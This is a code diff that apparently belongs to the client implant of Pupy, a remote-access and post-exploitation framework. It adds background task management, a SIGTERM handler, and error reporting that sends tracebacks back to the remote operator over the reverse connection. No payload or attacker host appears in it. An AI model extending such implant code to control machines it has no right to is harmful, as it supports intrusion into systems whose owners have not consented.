@@ -60,6 +60,7 @@ from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
 from network.lib.streams.PupySocketStream import PupyChannel
+from network.lib.transports.cryptoutils.aes import NewAESCipher as AES
 import logging
 import shlex
 import marshal
@@ -130,6 +131,154 @@ REVERSE_SLAVE_CONF = dict(
     instantiate_oldstyle_exceptions=True,
 )
 
+def print_exception(tag=''):
+    global debug
+
+    remote_print_error = None
+    dprint = None
+    try:
+        import pupyimporter
+        remote_print_error = pupyimporter.remote_print_error
+        dprint = pupyimporter.dprint
+    except:
+        pass
+
+    import traceback
+    trace = str(traceback.format_exc())
+    error = ' '.join([ x for x in (
+        tag, 'Exception:', trace
+    ) if x ])
+    print "// DEBUG: {}".format(error)
+    if remote_print_error:
+        try:
+            remote_print_error(error)
+        except Exception, e:
+            print "Exception during remote printing: ", e
+            pass
+        else:
+            if dprint:
+                dprint(error)
+            elif debug:
+                try:
+                    logging.error(error)
+                except:
+                    print error
+
+
+class Task(threading.Thread):
+    stopped = None
+    results_type = list
+
+    def __init__(self, *args, **kwargs):
+        threading.Thread.__init__(self)
+        self.daemon = True
+        self.stopped = threading.Event()
+        self._results = self.results_type()
+
+    @property
+    def name(self):
+        return type(self).__name__
+
+    @property
+    def results(self):
+        results = self._results
+        self._results = self.results_type()
+        return results
+
+    def append(self, result):
+        if self.results_type in (str, unicode):
+            self._results += result
+        elif self.results_type == list:
+            self._results.append(result)
+        elif self.results_type == set:
+            self._results.add(result)
+        else:
+            raise TypeError('Unknown results type: {}'.format(self.results_type))
+
+    def stop(self):
+        if self.stopped and self.active:
+            self.stopped.set()
+
+    def run(self):
+        try:
+            self.task()
+        except:
+            print_exception('[T/R:{}]'.format(self.name))
+            if self.stopped:
+                self.stopped.set()
+
+    @property
+    def active(self):
+        if not self.stopped:
+            return False
+
+        try:
+            return not self.stopped.is_set()
+        except:
+            print_exception('[T/A:{}]'.format(self.name))
+
+    def event(self, event):
+        pass
+
+class Manager(object):
+    TERMINATE = 0
+    PAUSE = 1
+    SESSION = 2
+
+    def __new__(cls, *args, **kw):
+        if not hasattr(cls, '_instance'):
+            orig = super(Manager, cls)
+            cls._instance = orig.__new__(cls, *args, **kw)
+
+        return cls._instance
+
+    def __init__(self):
+        self.tasks = {}
+
+    def get(self, klass):
+        name = klass.__name__
+        return self.tasks.get(name)
+
+    def create(self, klass, *args, **kwargs):
+        name = klass.__name__
+        if not name in self.tasks:
+            try:
+                task = klass(*args, **kwargs)
+                task.start()
+                self.tasks[name] = task
+                return task
+
+            except:
+                print_exception('[M/C:{}]'.format(name))
+
+    def stop(self, klass, force=False):
+        name = klass.__name__
+        if name in self.tasks:
+            try:
+                self.tasks[name].stop()
+                del self.tasks[name]
+            except:
+                print_exception('[M/S:{}]'.format(name))
+                if force:
+                    del self.tasks[name]
+
+    def active(self, klass):
+        name = klass.__name__
+        if name in self.tasks:
+            return self.tasks[name].stopped.is_set()
+        else:
+            return False
+
+    def event(self, event):
+        for task in self.tasks.itervalues():
+            try:
+                task.event(event)
+            except:
+                print_exception('[M/E:{}:{}]'.format(task.name, event))
+
+setattr(pupy, 'manager', Manager())
+setattr(pupy, 'Task', Task)
+
 class UpdatableModuleNamespace(ModuleNamespace):
     __slots__ = ['__invalidate__']
 
@@ -156,15 +305,14 @@ class ReverseSlaveService(Service):
             try:
                 cleanup()
             except Exception as e:
-                logging.exception(e)
+                print_exception('[D]')
 
         self.exposed_cleanups = []
 
         try:
             self._conn.close()
         except Exception as e:
-            logging.exception(e)
-            raise
+            print_exception('[DC]')
 
         if os.name == 'posix':
             try:
@@ -289,6 +437,13 @@ def handle_sigchld(*args, **kwargs):
 def handle_sighup(*args):
     pass
 
+def handle_sigterm(*args):
+    try:
+        manager = Manager()
+        manager.event(manager.TERMINATE)
+    except:
+        print_exception('[ST]')
+
 attempt = 0
 
 def main():
@@ -300,8 +455,10 @@ def main():
     try:
         if hasattr(signal, 'SIGHUP'):
             signal.signal(signal.SIGHUP, handle_sighup)
+        if hasattr(signal, 'SIGTERM'):
+            signal.signal(signal.SIGTERM, handle_sigterm)
     except:
-        pass
+        print_exception('[MS]')
 
     if len(sys.argv) > 1:
         parser = argparse.ArgumentParser(
@@ -369,14 +526,10 @@ def main():
             rpyc_loop(launcher)
 
         except Exception as e:
+            print_exception('[ML]')
+
             if type(e) == SystemExit:
                 exited = True
-
-            if debug:
-                try:
-                    logging.exception(e)
-                except:
-                    print "Exception ({}): {}".format(type(e), e)
 
         finally:
             if not exited:
@@ -447,12 +600,9 @@ def rpyc_loop(launcher):
         except EOFError:
             pass
 
-        except Exception as e:
-            if debug:
-                try:
-                    logging.exception(e)
-                except:
-                    print "Exception ({}): {}".format(type(e), e)
+        except:
+            print_exception('[M]')
+
         finally:
             if stream is not None:
                 try:
